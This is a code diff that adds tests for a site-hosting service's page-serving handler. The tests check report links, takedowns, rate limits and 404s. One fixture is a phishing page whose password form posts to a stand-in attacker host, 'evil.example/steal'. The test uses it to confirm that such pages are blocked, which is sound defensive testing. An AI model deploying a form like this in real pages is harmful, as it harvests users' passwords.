@@ -193,3 +193,26 @@ for (let i = 0; i < 10; i++) await report.onRequestPost({ request: req({ name: "
 [s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }, null, "7.7.7.7"), env }));
 assert(s === 429, "11th report from one visitor in an hour is refused");
 delete globalThis.caches;
+
+// ---- get-site-html (what the subdomain router serves) ----
+const gsh = await import(F + "get-site-html.js");
+const getSite = async (name) => j(gsh.onRequestPost({ request: req({ name }), env }));
+entities.PublishedSite.push(
+  { id: "i1", name: "inline", html: "<html><body><h1>Inline</h1></body></html>", created_by_id: "u2" },
+  { id: "i2", name: "phish", html: '<html><body><form action="https://evil.example/steal"><input type="password"></form></body></html>', created_by_id: "u2" },
+);
+delete globalThis.caches;
+store.delete("blocked:site:nova");
+store.set("site:nova", "<html><body><h1>Nova</h1></body></html>");
+entities.PublishedSite[0].html = "https://nebuluxai.pages.dev/published/site/nova?v=1";
+[s, b] = await getSite("nova");
+assert(s === 200 && b.html.includes("<h1>Nova</h1>") && b.html.includes("Report</a>") && b.html.includes("blackhole-checkout"), "KV site served with bridge + report link");
+[s, b] = await getSite("inline");
+assert(b.html.includes("<h1>Inline</h1>") && b.html.includes("Report</a>"), "inline (direct-write) site gets the report link too");
+[s, b] = await getSite("phish");
+assert(b.html.includes("has been removed") && b.html.includes("passwords") && !b.html.includes("evil.example"), "phishing page written straight into the record is not served");
+store.set("blocked:site:inline", "x");
+[s, b] = await getSite("inline");
+assert(b.html.includes("has been removed") && !b.html.includes("<h1>Inline</h1>"), "take-down applies even to inline HTML");
+[s, b] = await getSite("nobody");
+assert(s === 404, "unknown site 404");
